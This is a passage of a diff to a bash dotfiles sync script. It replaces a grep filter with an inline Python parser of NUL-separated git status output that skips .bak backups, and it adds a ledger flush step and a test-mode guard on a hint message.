     if pushd "$DOTFILES_DIR" >/dev/null; then
         # 排除 conflict-resolve 写下的 .bak 备份：sync_commit_push 会用 pathspec
         # ':!**/*.bak' 跳过它们，但本判断在那之前；不滤掉的话只剩 .bak 时也会进 commit 分支
-        # `tr -d '\r'` 防御 Windows CRLF 环境下 porcelain 输出尾部可能残留 \r，导致
-        # 末尾锚 `\.bak$` 失配
-        DOTFILES_STATUS=$(git status --porcelain | tr -d '\r' | grep -v '^\?\? .*\.bak$')
+        # 用 `git status --porcelain -z`：NUL 分隔的条目避开 core.quotePath
+        # c-quoting，含 UTF-8 / 控制字符的文件名也能完整保留 .bak 后缀，
+        # 让 endswith('.bak') 判定可靠（之前 grep -Ev 路径在 c-quoted
+        # 文件名上偶尔漏过）。Python 解析后回吐换行分隔的过滤结果——只用
+        # 来判断 "是否需要提交"，下游用 pathspec 排除 .bak。
+        DOTFILES_STATUS=$(git status --porcelain=v1 -z 2>/dev/null | python -I -c '
+import sys
+data = sys.stdin.buffer.read()
+remaining = []
+for entry in data.split(b"\x00"):
+    if not entry:
+        continue
+    if len(entry) < 4:
+        remaining.append(entry)
+        continue
+    code = entry[:2]
+    path = entry[3:]
+    if code == b"??":
+        # Match both <file>.bak (primary slot) and <file>.bak.<epoch>
+        # (_safe_bak timestamp fallback). basename check so a file
+        # literally named ".bak" or with .bak embedded in a path
+        # component does not get false-filtered. Stays in lockstep
+        # with sync_commit_push pathspec; if either drifts the dotfiles
+        # repo either grows phantom backups or fires "no commit" loops.
+        basename = path.rsplit(b"/", 1)[-1]
+        if basename.endswith(b".bak") or b".bak." in basename:
+            continue
+    remaining.append(entry)
+sys.stdout.write(b"\n".join(remaining).decode("utf-8", errors="replace"))
+' 2>/dev/null)
         if [ -n "$DOTFILES_STATUS" ]; then
             if sync_commit_push "dotfiles"; then
                 echo -e "${GREEN}dotfiles 已提交并推送${NC}"
@@ -2312,6 +3598,12 @@ if [ -d "$DOTFILES_DIR" ]; then
     fi
 fi
 
+# Flush buffered ledger ops AFTER step 6's dotfiles commit-push, so the SHA
+# we record reflects the post-commit HEAD. Runs even on HAS_ERROR — partial
+# ledger state is still useful (next sync's Case 3 needs SOME ledger entries
+# to disambiguate zombies; missing entries fall through to current behavior).
+_ledger_flush || true
+
 if [ $HAS_ERROR -ne 0 ]; then
     echo ""
     echo -e "${YELLOW}有仓库处理失败，建议使用 Claude Code /sync 处理。${NC}"
@@ -2319,7 +3611,7 @@ if [ $HAS_ERROR -ne 0 ]; then
 fi
 
 # --- Repo sync disabled hint ---
-if [ "${ENABLE_REPO_SYNC:-false}" != "true" ]; then
+if [ "${ENABLE_REPO_SYNC:-false}" != "true" ] && [ "${SYNC_TEST_MODE:-}" != "1" ]; then
     HINT_FILE="${SCRIPT_DIR}/.repo_sync_hint_count"
     hint_count=0
     if [ -f "$HINT_FILE" ]; then
